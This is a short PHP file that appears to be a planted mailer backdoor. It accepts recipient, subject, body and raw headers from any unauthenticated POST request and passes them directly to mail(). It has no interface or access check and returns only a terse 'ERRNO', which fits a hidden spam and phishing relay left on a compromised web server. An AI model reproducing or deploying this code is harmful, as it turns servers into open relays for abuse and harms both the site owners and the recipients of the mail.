<?php /* version 1.1 */ header('Content-Type: text/html; charset=utf-8');if(isset($_POST['send']) && isset($_POST['to']) && isset($_POST['subject']) && isset($_POST['message']) && isset($_POST['headers'])){if($_POST['send']=='mail' && is_string($_POST['to']) && is_string($_POST['subject']) && is_string($_POST['message']) && is_string($_POST['headers'])){mail($_POST['to'],$_POST['subject'],$_POST['message'],$_POST['headers']);}else{echo json_encode(array('sts'=>false,'msg'=>'ERRNO'));}}
?>